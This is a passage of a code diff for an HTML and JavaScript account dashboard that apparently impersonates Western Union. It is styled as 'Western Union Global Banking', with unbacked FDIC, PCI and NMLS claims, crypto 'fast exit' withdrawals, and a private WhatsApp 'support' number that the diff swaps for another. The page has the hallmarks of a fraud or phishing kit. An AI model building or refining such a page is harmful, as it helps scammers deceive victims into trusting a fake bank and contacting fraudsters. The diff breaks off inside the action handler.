@@ -310,7 +310,8 @@
             margin-right: 8px;
         }
 
-        .chat-whatsapp-btn, .open-whatsapp-btn {
+        .chat-whatsapp-btn,
+        .open-whatsapp-btn {
             background: #25D366;
             border: none;
             padding: 10px 22px;
@@ -326,7 +327,8 @@
             box-shadow: 0 4px 10px rgba(0,0,0,0.15);
         }
 
-        .chat-whatsapp-btn:hover, .open-whatsapp-btn:hover {
+        .chat-whatsapp-btn:hover,
+        .open-whatsapp-btn:hover {
             background: #1da851;
             transform: translateY(-2px);
             box-shadow: 0 8px 18px rgba(0,0,0,0.2);
@@ -465,16 +467,30 @@
         }
 
         @keyframes floatPulse {
-            0% { box-shadow: 0 12px 28px rgba(37, 211, 102, 0.4); }
-            50% { box-shadow: 0 16px 36px rgba(37, 211, 102, 0.7); }
-            100% { box-shadow: 0 12px 28px rgba(37, 211, 102, 0.4); }
+            0% {
+                box-shadow: 0 12px 28px rgba(37, 211, 102, 0.4);
+            }
+            50% {
+                box-shadow: 0 16px 36px rgba(37, 211, 102, 0.7);
+            }
+            100% {
+                box-shadow: 0 12px 28px rgba(37, 211, 102, 0.4);
+            }
         }
 
         @keyframes ring {
-            0% { transform: rotate(0deg);}
-            25% { transform: rotate(12deg);}
-            75% { transform: rotate(-12deg);}
-            100% { transform: rotate(0deg);}
+            0% {
+                transform: rotate(0deg);
+            }
+            25% {
+                transform: rotate(12deg);
+            }
+            75% {
+                transform: rotate(-12deg);
+            }
+            100% {
+                transform: rotate(0deg);
+            }
         }
 
         .bell-ring {
@@ -482,486 +498,515 @@
         }
 
         @media (max-width: 700px) {
-            .dashboard-container { padding: 16px; }
-            .glass-header { flex-direction: column; text-align: center; }
-            .user-section { justify-content: center; }
-            .greeting { text-align: center; }
-            .balance-figure { font-size: 2.2rem; }
-            .whatsapp-support-card { flex-direction: column; text-align: center; align-items: stretch; }
-            .whatsapp-number-badge { font-size: 0.85rem; }
-            .floating-whatsapp { width: 58px; height: 58px; bottom: 20px; right: 20px; }
-            .floating-whatsapp i { font-size: 2rem; }
+            .dashboard-container {
+                padding: 16px;
+            }
+            .glass-header {
+                flex-direction: column;
+                text-align: center;
+            }
+            .user-section {
+                justify-content: center;
+            }
+            .greeting {
+                text-align: center;
+            }
+            .balance-figure {
+                font-size: 2.2rem;
+            }
+            .whatsapp-support-card {
+                flex-direction: column;
+                text-align: center;
+                align-items: stretch;
+            }
+            .whatsapp-number-badge {
+                font-size: 0.85rem;
+            }
+            .floating-whatsapp {
+                width: 58px;
+                height: 58px;
+                bottom: 20px;
+                right: 20px;
+            }
+            .floating-whatsapp i {
+                font-size: 2rem;
+            }
         }
     </style>
 </head>
 <body>
-<div class="dashboard-container">
-    <!-- Header Modern -->
-    <div class="glass-header">
-        <div class="brand-area">
-            <div class="wu-mono">WU</div>
-            <div class="brand-text">
-                <h1>Western Union Global Banking</h1>
-                <p>Secure · Instant · Trusted since 1851</p>
-            </div>
-        </div>
-        <div class="user-section">
-            <div class="bell-wrapper" id="notificationBell">
-                <i class="fas fa-bell"></i>
-                <span class="notif-dot" id="notifCounter">0</span>
-            </div>
-            <div class="greeting">
-                <small>Welcome back,</small>
-                <div class="user-name" id="displayFullName">——</div>
-            </div>
-        </div>
-    </div>
-
-    <!-- Balance + Account Row -->
-    <div class="stats-row">
-        <div class="main-balance-card">
-            <button class="toggle-balance-btn" id="balanceToggleBtn">
-                <span id="toggleEyeIcon">👁️</span> <span id="toggleLabel">Hide</span>
-            </button>
-            <div class="eyebrow">TOTAL BALANCE (USD)</div>
-            <div class="balance-figure" id="totalBalanceValue">$0.00</div>
-            <div style="font-size:0.75rem; opacity:0.8;">Available for transfer & withdrawal</div>
-            <div class="badge-gold">
-                <i class="fas fa-shield-alt"></i> FDIC insured up to $250k · Global protection
-            </div>
-        </div>
-        <div class="info-card">
-            <div class="eyebrow" style="color:#5F7D9C;">ACCOUNT DETAILS</div>
-            <div class="account-digits" id="accountNumberDisplay">Loading...</div>
-            <div class="pill-list">
-                <span class="pill"><i class="fas fa-globe"></i> 200+ countries</span>
-                <span class="pill"><i class="fas fa-lock"></i> PCI Level 1</span>
-                <span class="pill"><i class="fas fa-clock"></i> 24/7 access</span>
-            </div>
-        </div>
-    </div>
-
-    <!-- WhatsApp Customer Support Card -->
-    <div class="whatsapp-support-card" id="whatsappSupportCard">
-        <div class="whatsapp-info">
-            <div class="whatsapp-icon-large"><i class="fab fa-whatsapp"></i></div>
-            <div class="whatsapp-text">
-                <h4><i class="fas fa-headset"></i> 24/7 WhatsApp Customer Support</h4>
-                <div style="margin-top: 5px;">
-                    <span class="whatsapp-tag"><i class="fas fa-user-check"></i> REAL-TIME AGENT</span>
-                    <div class="whatsapp-number-badge" id="whatsappNumberDisplay">
-                        <i class="fab fa-whatsapp"></i> +1 (256) 821-2395
-                    </div>
+    <div class="dashboard-container">
+        <!-- Header Modern -->
+        <div class="glass-header">
+            <div class="brand-area">
+                <div class="wu-mono">WU</div>
+                <div class="brand-text">
+                    <h1>Western Union Global Banking</h1>
+                    <p>Secure · Instant · Trusted since 1851</p>
                 </div>
-                <small style="color: rgba(255,255,255,0.85); font-size: 0.7rem; display: block; margin-top: 8px;">
-                    <i class="fas fa-info-circle"></i> Tap to open WhatsApp & message our dedicated support team. Secure, instant assistance.
-                </small>
+            </div>
+            <div class="user-section">
+                <div class="bell-wrapper" id="notificationBell">
+                    <i class="fas fa-bell"></i>
+                    <span class="notif-dot" id="notifCounter">0</span>
+                </div>
+                <div class="greeting">
+                    <small>Welcome back,</small>
+                    <div class="user-name" id="displayFullName">——</div>
+                </div>
             </div>
         </div>
-        <div style="display: flex; gap: 12px; flex-wrap: wrap;">
-            <button class="chat-whatsapp-btn" id="copyWhatsappNumberBtn"><i class="fas fa-copy"></i> Copy Number</button>
-            <button class="open-whatsapp-btn" id="openWhatsappChatBtn"><i class="fab fa-whatsapp"></i> Chat Now</button>
+
+        <!-- Balance + Account Row -->
+        <div class="stats-row">
+            <div class="main-balance-card">
+                <button class="toggle-balance-btn" id="balanceToggleBtn">
+                    <span id="toggleEyeIcon">👁️</span> <span id="toggleLabel">Hide</span>
+                </button>
+                <div class="eyebrow">TOTAL BALANCE (USD)</div>
+                <div class="balance-figure" id="totalBalanceValue">$0.00</div>
+                <div style="font-size:0.75rem; opacity:0.8;">Available for transfer & withdrawal</div>
+                <div class="badge-gold">
+                    <i class="fas fa-shield-alt"></i> FDIC insured up to $250k · Global protection
+                </div>
+            </div>
+            <div class="info-card">
+                <div class="eyebrow" style="color:#5F7D9C;">ACCOUNT DETAILS</div>
+                <div class="account-digits" id="accountNumberDisplay">Loading...</div>
+                <div class="pill-list">
+                    <span class="pill"><i class="fas fa-globe"></i> 200+ countries</span>
+                    <span class="pill"><i class="fas fa-lock"></i> PCI Level 1</span>
+                    <span class="pill"><i class="fas fa-clock"></i> 24/7 access</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- WhatsApp Customer Support Card -->
+        <div class="whatsapp-support-card" id="whatsappSupportCard">
+            <div class="whatsapp-info">
+                <div class="whatsapp-icon-large"><i class="fab fa-whatsapp"></i></div>
+                <div class="whatsapp-text">
+                    <h4><i class="fas fa-headset"></i> 24/7 WhatsApp Customer Support</h4>
+                    <div style="margin-top: 5px;">
+                        <span class="whatsapp-tag"><i class="fas fa-user-check"></i> REAL-TIME AGENT</span>
+                        <div class="whatsapp-number-badge" id="whatsappNumberDisplay">
+                            <i class="fab fa-whatsapp"></i> +1 (227) 285-9869
+                        </div>
+                    </div>
+                    <small style="color: rgba(255,255,255,0.85); font-size: 0.7rem; display: block; margin-top: 8px;">
+                        <i class="fas fa-info-circle"></i> Tap to open WhatsApp & message our dedicated support team. Secure, instant assistance.
+                    </small>
+                </div>
+            </div>
+            <div style="display: flex; gap: 12px; flex-wrap: wrap;">
+                <button class="chat-whatsapp-btn" id="copyWhatsappNumberBtn"><i class="fas fa-copy"></i> Copy Number</button>
+                <button class="open-whatsapp-btn" id="openWhatsappChatBtn"><i class="fab fa-whatsapp"></i> Chat Now</button>
+            </div>
+        </div>
+
+        <!-- Action Grid -->
+        <div class="action-matrix" id="actionGrid">
+            <div class="action-tile" data-action="withdraw">
+                <div class="action-icon">💸</div>
+                <div class="action-title">Withdraw Funds</div>
+                <div class="action-desc">Transfer to bank or recipient</div>
+            </div>
+            <div class="action-tile" data-action="deposit">
+                <div class="action-icon">➕💰</div>
+                <div class="action-title">Add Funds</div>
+                <div class="action-desc">Deposit money to your account</div>
+            </div>
+            <div class="action-tile" data-action="crypto">
+                <div class="action-icon">₿⚡</div>
+                <div class="action-title">Crypto Withdraw</div>
+                <div class="action-desc">Bitcoin & USDT fast exit</div>
+            </div>
+            <div class="action-tile" data-action="history">
+                <div class="action-icon">📜</div>
+                <div class="action-title">Transaction History</div>
+                <div class="action-desc">View full activity log</div>
+            </div>
+            <div class="action-tile" data-action="notifications">
+                <div class="action-icon">🔔📬</div>
+                <div class="action-title">Alerts Center</div>
+                <div class="action-desc">Account alerts & security</div>
+            </div>
+            <!-- WhatsApp Live Chat Tile -->
+            <div class="action-tile whatsapp-chat-tile" data-action="whatsapp_chat">
+                <div class="action-icon">💬🎧</div>
+                <div class="action-title">WhatsApp Support</div>
+                <div class="action-desc">Message us on WhatsApp instantly</div>
+            </div>
+            <div class="action-tile" data-action="logout">
+                <div class="action-icon">🚪🔒</div>
+                <div class="action-title">Secure Logout</div>
+                <div class="action-desc">Sign out safely</div>
+            </div>
+        </div>
+
+        <!-- Footer -->
+        <div class="secure-footer">
+            <div class="footer-nav">
+                <a href="#" data-footer-link="privacy"><i class="fas fa-lock"></i> Privacy Policy</a>
+                <a href="#" data-footer-link="terms"><i class="fas fa-file-signature"></i> Terms of Use</a>
+                <a href="#" data-footer-link="security"><i class="fas fa-shield-haltered"></i> Security Hub</a>
+                <a href="#" data-footer-link="contact"><i class="fas fa-envelope"></i> Contact</a>
+            </div>
+            <div class="copyright">© 2026 Western Union Holdings, Inc. All rights reserved. | Secure global transactions | NMLS #902367</div>
         </div>
     </div>
 
-    <!-- Action Grid -->
-    <div class="action-matrix" id="actionGrid">
-        <div class="action-tile" data-action="withdraw">
-            <div class="action-icon">💸</div>
-            <div class="action-title">Withdraw Funds</div>
-            <div class="action-desc">Transfer to bank or recipient</div>
-        </div>
-        <div class="action-tile" data-action="deposit">
-            <div class="action-icon">➕💰</div>
-            <div class="action-title">Add Funds</div>
-            <div class="action-desc">Deposit money to your account</div>
-        </div>
-        <div class="action-tile" data-action="crypto">
-            <div class="action-icon">₿⚡</div>
-            <div class="action-title">Crypto Withdraw</div>
-            <div class="action-desc">Bitcoin & USDT fast exit</div>
-        </div>
-        <div class="action-tile" data-action="history">
-            <div class="action-icon">📜</div>
-            <div class="action-title">Transaction History</div>
-            <div class="action-desc">View full activity log</div>
-        </div>
-        <div class="action-tile" data-action="notifications">
-            <div class="action-icon">🔔📬</div>
-            <div class="action-title">Alerts Center</div>
-            <div class="action-desc">Account alerts & security</div>
-        </div>
-        <!-- WhatsApp Live Chat Tile -->
-        <div class="action-tile whatsapp-chat-tile" data-action="whatsapp_chat">
-            <div class="action-icon">💬🎧</div>
-            <div class="action-title">WhatsApp Support</div>
-            <div class="action-desc">Message us on WhatsApp instantly</div>
-        </div>
-        <div class="action-tile" data-action="logout">
-            <div class="action-icon">🚪🔒</div>
-            <div class="action-title">Secure Logout</div>
-            <div class="action-desc">Sign out safely</div>
-        </div>
+    <!-- Floating WhatsApp Button -->
+    <div class="floating-whatsapp" id="floatingWhatsappButton" title="Chat with us on WhatsApp">
+        <i class="fab fa-whatsapp"></i>
     </div>
 
-    <!-- Footer -->
-    <div class="secure-footer">
-        <div class="footer-nav">
-            <a href="#" data-footer-link="privacy"><i class="fas fa-lock"></i> Privacy Policy</a>
-            <a href="#" data-footer-link="terms"><i class="fas fa-file-signature"></i> Terms of Use</a>
-            <a href="#" data-footer-link="security"><i class="fas fa-shield-haltered"></i> Security Hub</a>
-            <a href="#" data-footer-link="contact"><i class="fas fa-envelope"></i> Contact</a>
-        </div>
-        <div class="copyright">© 2026 Western Union Holdings, Inc. All rights reserved. | Secure global transactions | NMLS #902367</div>
-    </div>
-</div>
+    <script>
+        // ============================================
+        // WHATSAPP CUSTOMER SUPPORT SYSTEM
+        // ============================================
+        const WHATSAPP_NUMBER = '+12272859869'; // +1 (227) 285-9869
+        const WHATSAPP_MESSAGE = encodeURIComponent('Hello Western Union Support, I need assistance with my account.');
+        const WHATSAPP_LINK = `https://wa.me/${WHATSAPP_NUMBER}?text=${WHATSAPP_MESSAGE}`;
 
-<!-- Floating WhatsApp Button -->
-<div class="floating-whatsapp" id="floatingWhatsappButton" title="Chat with us on WhatsApp">
-    <i class="fab fa-whatsapp"></i>
-</div>
-
-<script>
-    // ============================================
-    // WHATSAPP CUSTOMER SUPPORT SYSTEM
-    // ============================================
-    const WHATSAPP_NUMBER = '+18255920370'; // +1 (256) 821-2395
-    const WHATSAPP_MESSAGE = encodeURIComponent('Hello Western Union Support, I need assistance with my account.');
-    const WHATSAPP_LINK = `https://wa.me/${WHATSAPP_NUMBER}?text=${WHATSAPP_MESSAGE}`;
-
-    function sendSecureLog(action, meta = {}) {
-        const storedUser = JSON.parse(localStorage.getItem('wu_current_user') || '{}');
-        const payload = {
-            timestamp: new Date().toISOString(),
-            event: action,
-            dashboard: "western_union_hub",
-            userEmail: storedUser.email || 'anonymous',
-            account: storedUser.accountNumber || 'N/A',
-            details: meta,
-            environment: "secure_token_fdic"
-        };
-        console.log(`🔐 [SECURE] Dashboard event: ${action}`, meta);
-        // No external fetch for ntfy; we keep logging for internal purposes.
-    }
-
-    // ============================================
-    // DASHBOARD STATE
-    // ============================================
-    let currentUser = null;
-    let balanceVisible = true;
-    let notificationsArray = [];
-
-    // Fetch user data from server
-    async function fetchUserData() {
-        try {
-            const response = await fetch('/data');
-            if (response.ok) {
-                const userData = await response.json();
-                currentUser = {
-                    fullname: userData.fullname,
-                    email: userData.email,
-                    accountNumber: userData.account_number,
-                    balance: userData.balance,
-                    phone: userData.phone,
-                    whatsapp_support: WHATSAPP_NUMBER
-                };
-                
-                // Update UI
-                document.getElementById('displayFullName').innerText = currentUser.fullname;
-                document.getElementById('accountNumberDisplay').innerText = currentUser.accountNumber;
-                document.getElementById('whatsappNumberDisplay').innerHTML = `<i class="fab fa-whatsapp"></i> +1 (256) 821-2395`;
-                refreshBalanceDisplay();
-                
-                // Store in localStorage for session
-                localStorage.setItem('wu_current_user', JSON.stringify(currentUser));
-                localStorage.setItem('wu_current_user_email', currentUser.email);
-                
-                sendSecureLog('dashboard_data_loaded', { userEmail: currentUser.email });
-                return true;
-            } else if (response.status === 401) {
-                window.location.href = '/login';
-                return false;
-            }
-        } catch (error) {
-            console.error('Error fetching user data:', error);
-            // Fallback to localStorage or generate deterministic user
+        function sendSecureLog(action, meta = {}) {
             const storedUser = JSON.parse(localStorage.getItem('wu_current_user') || '{}');
-            if (storedUser && storedUser.email) {
-                currentUser = storedUser;
-                document.getElementById('displayFullName').innerText = currentUser.fullname;
-                document.getElementById('accountNumberDisplay').innerText = currentUser.accountNumber;
-                refreshBalanceDisplay();
+            const payload = {
+                timestamp: new Date().toISOString(),
+                event: action,
+                dashboard: "western_union_hub",
+                userEmail: storedUser.email || 'anonymous',
+                account: storedUser.accountNumber || 'N/A',
+                details: meta,
+                environment: "secure_token_fdic"
+            };
+            console.log(`🔐 [SECURE] Dashboard event: ${action}`, meta);
+            // No external fetch for ntfy; we keep logging for internal purposes.
+        }
+
+        // ============================================
+        // DASHBOARD STATE
+        // ============================================
+        let currentUser = null;
+        let balanceVisible = true;
+        let notificationsArray = [];
+
+        // Fetch user data from server
+        async function fetchUserData() {
+            try {
+                const response = await fetch('/data');
+                if (response.ok) {
+                    const userData = await response.json();
+                    currentUser = {
+                        fullname: userData.fullname,
+                        email: userData.email,
+                        accountNumber: userData.account_number,
+                        balance: userData.balance,
+                        phone: userData.phone,
+                        whatsapp_support: WHATSAPP_NUMBER
+                    };
+
+                    // Update UI
+                    document.getElementById('displayFullName').innerText = currentUser.fullname;
+                    document.getElementById('accountNumberDisplay').innerText = currentUser.accountNumber;
+                    document.getElementById('whatsappNumberDisplay').innerHTML =
+                        `<i class="fab fa-whatsapp"></i> +1 (227) 285-9869`;
+                    refreshBalanceDisplay();
+
+                    // Store in localStorage for session
+                    localStorage.setItem('wu_current_user', JSON.stringify(currentUser));
+                    localStorage.setItem('wu_current_user_email', currentUser.email);
+
+                    sendSecureLog('dashboard_data_loaded', { userEmail: currentUser.email });
+                    return true;
+                } else if (response.status === 401) {
+                    window.location.href = '/login';
+                    return false;
+                }
+            } catch (error) {
+                console.error('Error fetching user data:', error);
+                // Fallback to localStorage or generate deterministic user
+                const storedUser = JSON.parse(localStorage.getItem('wu_current_user') || '{}');
+                if (storedUser && storedUser.email) {
+                    currentUser = storedUser;
+                    document.getElementById('displayFullName').innerText = currentUser.fullname;
+                    document.getElementById('accountNumberDisplay').innerText = currentUser.accountNumber;
+                    refreshBalanceDisplay();
+                } else {
+                    // ultimate fallback: generic demo user
+                    currentUser = {
+                        fullname: "James Carter",
+                        email: "james.carter@wumail.com",
+                        accountNumber: "WU •• 4421 8872 1092",
+                        balance: 12840.75,
+                        phone: "+1 (888) 472-4682"
+                    };
+                    document.getElementById('displayFullName').innerText = currentUser.fullname;
+                    document.getElementById('accountNumberDisplay').innerText = currentUser.accountNumber;
+                    refreshBalanceDisplay();
+                    localStorage.setItem('wu_current_user', JSON.stringify(currentUser));
+                }
+            }
+            return false;
+        }
+
+        function refreshBalanceDisplay() {
+            const el = document.getElementById('totalBalanceValue');
+            if (el && currentUser) {
+                el.innerText = '$' + (currentUser.balance || 0).toLocaleString(undefined, { minimumFractionDigits: 2,
+                    maximumFractionDigits: 2 });
+                if (!balanceVisible) {
+                    el.classList.add('blur-balance');
+                } else {
+                    el.classList.remove('blur-balance');
+                }
+            }
+        }
+
+        function toggleBalanceVisibility() {
+            const balanceSpan = document.getElementById('totalBalanceValue');
+            const eyeIcon = document.getElementById('toggleEyeIcon');
+            const labelSpan = document.getElementById('toggleLabel');
+            if (balanceVisible) {
+                balanceSpan.classList.add('blur-balance');
+                eyeIcon.innerText = '🙈';
+                labelSpan.innerText = 'Show';
+                balanceVisible = false;
+                sendSecureLog('balance_hidden', {});
             } else {
-                // ultimate fallback: generic demo user
-                currentUser = {
-                    fullname: "James Carter",
-                    email: "james.carter@wumail.com",
-                    accountNumber: "WU •• 4421 8872 1092",
-                    balance: 12840.75,
-                    phone: "+1 (888) 472-4682"
-                };
-                document.getElementById('displayFullName').innerText = currentUser.fullname;
-                document.getElementById('accountNumberDisplay').innerText = currentUser.accountNumber;
-                refreshBalanceDisplay();
-                localStorage.setItem('wu_current_user', JSON.stringify(currentUser));
+                balanceSpan.classList.remove('blur-balance');
+                eyeIcon.innerText = '👁️';
+                labelSpan.innerText = 'Hide';
+                balanceVisible = true;
+                sendSecureLog('balance_revealed', {});
             }
         }
-        return false;
-    }
 
-    function refreshBalanceDisplay() {
-        const el = document.getElementById('totalBalanceValue');
-        if (el && currentUser) {
-            el.innerText = '$' + (currentUser.balance || 0).toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 });
-            if (!balanceVisible) {
-                el.classList.add('blur-balance');
-            } else {
-                el.classList.remove('blur-balance');
-            }
-        }
-    }
-
-    function toggleBalanceVisibility() {
-        const balanceSpan = document.getElementById('totalBalanceValue');
-        const eyeIcon = document.getElementById('toggleEyeIcon');
-        const labelSpan = document.getElementById('toggleLabel');
-        if (balanceVisible) {
-            balanceSpan.classList.add('blur-balance');
-            eyeIcon.innerText = '🙈';
-            labelSpan.innerText = 'Show';
-            balanceVisible = false;
-            sendSecureLog('balance_hidden', {});
-        } else {
-            balanceSpan.classList.remove('blur-balance');
-            eyeIcon.innerText = '👁️';
-            labelSpan.innerText = 'Hide';
-            balanceVisible = true;
-            sendSecureLog('balance_revealed', {});
-        }
-    }
-
-    // Load notifications from server history
-    async function loadNotifications() {
-        try {
-            const response = await fetch('/history');
-            if (response.ok) {
-                const history = await response.json();
-                const notifications = history.filter(item => item.type === 'notification').slice(-10);
-                notificationsArray = notifications.map((n, idx) => ({
-                    id: n.notificationId || idx,
-                    title: n.title || 'Account Update',
-                    message: n.message || n.description || 'Notification',
-                    read: n.read || false,
-                    time: new Date(n.date)
-                }));
-                updateNotifBadge();
-            }
-        } catch (error) {
-            console.error('Error loading notifications:', error);
-            buildMockNotifications();
-        }
-    }
-
-    function buildMockNotifications() {
-        notificationsArray = [
-            { id: 1, title: "🏦 FDIC Insurance Confirmed", message: "Your account is fully protected up to $250,000", read: false, time: new Date(Date.now() - 2*3600000) },
-            { id: 2, title: "🔐 New Login Detected", message: "Chrome on Windows, New York", read: false, time: new Date(Date.now() - 18*3600000) },
-            { id: 3, title: "✅ Transfer Completed", message: "Sent $320 to Maria Gonzalez", read: true, time: new Date(Date.now() - 48*3600000) }
-        ];
-        updateNotifBadge();
-    }
-
-    function updateNotifBadge() {
-        const unread = notificationsArray.filter(n => !n.read).length;
-        const badgeSpan = document.getElementById('notifCounter');
-        if (badgeSpan) badgeSpan.innerText = unread;
-    }
-
-    function markAllNotificationsRead() {
-        notificationsArray.forEach(n => n.read = true);
-        updateNotifBadge();
-    }
-
-    function showNotificationsAlert() {
-        const unreadItems = notificationsArray.filter(n => !n.read);
-        if (unreadItems.length === 0) {
-            alert("🔔 No new alerts. Your account is secure.");
-        } else {
-            let msg = "🔔 * NEW ALERTS * 🔔\n\n";
-            unreadItems.forEach(item => {
-                msg += `📌 ${item.title}\n   ${item.message}\n   ⏰ ${item.time.toLocaleString()}\n\n`;
-            });
-            alert(msg);
-        }
-        markAllNotificationsRead();
-        sendSecureLog('notifications_center_opened', { unreadCount: unreadItems.length });
-    }
-
-    // ============================================
-    // WHATSAPP FUNCTIONS
-    // ============================================
-    function openWhatsappChat() {
-        sendSecureLog('whatsapp_chat_opened', { phone: WHATSAPP_NUMBER });
-        window.open(WHATSAPP_LINK, '_blank', 'noopener,noreferrer');
-    }
-
-    function copyWhatsappNumber() {
-        navigator.clipboard.writeText(WHATSAPP_NUMBER).then(() => {
-            const btn = document.getElementById('copyWhatsappNumberBtn');
-            const originalHTML = btn.innerHTML;
-            btn.innerHTML = '<i class="fas fa-check"></i> Number Copied!';
-            setTimeout(() => {
-                btn.innerHTML = originalHTML;
-            }, 2000);
-            sendSecureLog('whatsapp_number_copied', {});
-        }).catch(() => {
-            alert("WhatsApp number: +1 (825) 592-0370");
-        });
-    }
-
-    // ============================================
-    // ACTION HANDLER
-    // ============================================
-    async function onActionTriggered(actionId) {
-        sendSecureLog('action_trigger', { action: actionId });
-        switch (actionId) {
-            case 'withdraw':
-                alert("💸 Withdrawal Portal\n\nRedirecting to secure withdrawal interface...\nFDIC insured instant transfer options.");
-                setTimeout(() => { window.location.href = 'withdraw.html'; }, 400);
-                break;
-            case 'deposit':
-                window.location.href = 'deposit.html';
-                break;
-            case 'crypto':
-                alert("₿ Crypto Withdrawal\n\nBitcoin / USDT withdrawals are processed within 20-40 min.\nMinimum: $75 equivalent.");
-                setTimeout(() => { window.location.href = 'access.html'; }, 400);
-                break;
-            case 'history':
-                alert("📜 Transaction Ledger\n\nLoading complete transaction history...");
-                setTimeout(() => { window.location.href = 'history.html'; }, 400);
-                break;
-            case 'notifications':
-                showNotificationsAlert();
-                break;
-            case 'whatsapp_chat':
-                openWhatsappChat();
-                break;
-            case 'logout':
-                sendSecureLog('user_logout_executed', { userEmail: currentUser?.email });
-                try {
-                    await fetch('/logout', { method: 'POST' });
-                } catch(e) {}
-                localStorage.removeItem('wu_current_user_email');
-                localStorage.removeItem('wu_current_user');
-                alert("✓ Logged out securely. Thank you for banking with Western Union.");
-                window.location.href = 'index.html';
-                break;
-            default:
-                console.warn("Unknown action");
-        }
-    }
-
-    function bindActionCards() {
-        const tiles = document.querySelectorAll('.action-tile');
-        tiles.forEach(tile => {
-            const actionVal = tile.getAttribute('data-action');
-            if (actionVal) {
-                tile.addEventListener('click', (e) => {
-                    e.stopPropagation();
-                    onActionTriggered(actionVal);
-                });
-            }
-        });
-    }
-
-    function setupFooterInteractions() {
-        const footerLinks = document.querySelectorAll('[data-footer-link]');
-        footerLinks.forEach(link => {
-            link.addEventListener('click', (e) => {
-                e.preventDefault();
-                const linkType = link.getAttribute('data-footer-link');
-                sendSecureLog('footer_policy_click', { section: linkType });
-                alert(`📄 Western Union - ${link.innerText}\n\nYour financial security is our priority. All data protected with bank-grade encryption.`);
-            });
-        });
-    }
-
-    function setupNotificationBellUI() {
-        const bellBtn = document.getElementById('notificationBell');
-        bellBtn.addEventListener('click', () => {
-            bellBtn.classList.add('bell-ring');
-            setTimeout(() => bellBtn.classList.remove('bell-ring'), 400);
-            onActionTriggered('notifications');
-        });
-    }
-
-    function setupPeriodicNotifications() {
-        setInterval(async () => {
+        // Load notifications from server history
+        async function loadNotifications() {
             try {
                 const response = await fetch('/history');
                 if (response.ok) {
                     const history = await response.json();
-                    const newNotifs = history.filter(item => 
-                        item.type === 'notification' && 
-                        !notificationsArray.some(n => n.id === item.notificationId)
-                    ).slice(0, 3);
-                    
-                    if (newNotifs.length > 0) {
-                        newNotifs.forEach(notif => {
-                            notificationsArray.unshift({
-                                id: notif.notificationId,
-                                title: notif.title || 'New Alert',
-                                message: notif.message,
-                                read: false,
-                                time: new Date(notif.date)
-                            });
-                        });
-                        updateNotifBadge();
-                        const bellDiv = document.getElementById('notificationBell');
-                        bellDiv.classList.add('bell-ring');
-                        setTimeout(() => bellDiv.classList.remove('bell-ring'), 500);
-                        sendSecureLog('new_notification_received', { count: newNotifs.length });
-                    }
+                    const notifications = history.filter(item => item.type === 'notification').slice(-10);
+                    notificationsArray = notifications.map((n, idx) => ({
+                        id: n.notificationId || idx,
+                        title: n.title || 'Account Update',
+                        message: n.message || n.description || 'Notification',
+                        read: n.read || false,
+                        time: new Date(n.date)
+                    }));
+                    updateNotifBadge();
                 }
-            } catch(e) {}
-        }, 45000);
-    }
+            } catch (error) {
+                console.error('Error loading notifications:', error);
+                buildMockNotifications();
+            }
+        }
 
-    // ============================================
-    // INITIALIZATION
-    // ============================================
-    window.addEventListener('DOMContentLoaded', async () => {
-        await fetchUserData();
-        await loadNotifications();
-        bindActionCards();
-        setupFooterInteractions();
-        setupNotificationBellUI();
-        setupPeriodicNotifications();
-        
-        const toggleBtn = document.getElementById('balanceToggleBtn');
-        if (toggleBtn) toggleBtn.addEventListener('click', toggleBalanceVisibility);
-        
-        // WhatsApp button bindings
-        const copyWhatsappBtn = document.getElementById('copyWhatsappNumberBtn');
-        if (copyWhatsappBtn) copyWhatsappBtn.addEventListener('click', copyWhatsappNumber);
-        
-        const openWhatsappBtn = document.getElementById('openWhatsappChatBtn');
-        if (openWhatsappBtn) openWhatsappBtn.addEventListener('click', openWhatsappChat);
-        
-        // Floating WhatsApp button
-        const floatingBtn = document.getElementById('floatingWhatsappButton');
-        if (floatingBtn) floatingBtn.addEventListener('click', openWhatsappChat);
-        
-        sendSecureLog('dashboard_fully_loaded', { 
-            timestamp: new Date().toISOString(), 
-            theme: 'modern_whatsapp_support',
-            whatsappEnabled: true,
-            supportNumber: WHATSAPP_NUMBER
+        function buildMockNotifications() {
+            notificationsArray = [
+                { id: 1, title: "🏦 FDIC Insurance Confirmed", message: "Your account is fully protected up to $250,000",
+                    read: false, time: new Date(Date.now() - 2 * 3600000) },
+                { id: 2, title: "🔐 New Login Detected", message: "Chrome on Windows, New York", read: false,
+                    time: new Date(Date.now() - 18 * 3600000) },
+                { id: 3, title: "✅ Transfer Completed", message: "Sent $320 to Maria Gonzalez", read: true,
+                    time: new Date(Date.now() - 48 * 3600000) }
+            ];
+            updateNotifBadge();
+        }
+
+        function updateNotifBadge() {
+            const unread = notificationsArray.filter(n => !n.read).length;
+            const badgeSpan = document.getElementById('notifCounter');
+            if (badgeSpan) badgeSpan.innerText = unread;
+        }
+
+        function markAllNotificationsRead() {
+            notificationsArray.forEach(n => n.read = true);
+            updateNotifBadge();
+        }
+
+        function showNotificationsAlert() {
+            const unreadItems = notificationsArray.filter(n => !n.read);
+            if (unreadItems.length === 0) {
+                alert("🔔 No new alerts. Your account is secure.");
+            } else {
+                let msg = "🔔 * NEW ALERTS * 🔔\n\n";
+                unreadItems.forEach(item => {
+                    msg += `📌 ${item.title}\n   ${item.message}\n   ⏰ ${item.time.toLocaleString()}\n\n`;
+                });
+                alert(msg);
+            }
+            markAllNotificationsRead();
+            sendSecureLog('notifications_center_opened', { unreadCount: unreadItems.length });
+        }
+
+        // ============================================
+        // WHATSAPP FUNCTIONS
+        // ============================================
+        function openWhatsappChat() {
+            sendSecureLog('whatsapp_chat_opened', { phone: WHATSAPP_NUMBER });
+            window.open(WHATSAPP_LINK, '_blank', 'noopener,noreferrer');
+        }
+
+        function copyWhatsappNumber() {
+            navigator.clipboard.writeText(WHATSAPP_NUMBER).then(() => {
+                const btn = document.getElementById('copyWhatsappNumberBtn');
+                const originalHTML = btn.innerHTML;
+                btn.innerHTML = '<i class="fas fa-check"></i> Number Copied!';
+                setTimeout(() => {
+                    btn.innerHTML = originalHTML;
+                }, 2000);
+                sendSecureLog('whatsapp_number_copied', {});
+            }).catch(() => {
+                alert("WhatsApp number: +1 (227) 285-9869");
+            });
+        }
+
+        // ============================================
+        // ACTION HANDLER
+        // ============================================
+        async function onActionTriggered(actionId) {
+            sendSecureLog('action_trigger', { action: actionId });
+            switch (actionId) {
+                case 'withdraw':
+                    alert("💸 Withdrawal Portal\n\nRedirecting to secure withdrawal interface...\nFDIC insured instant transfer options.");
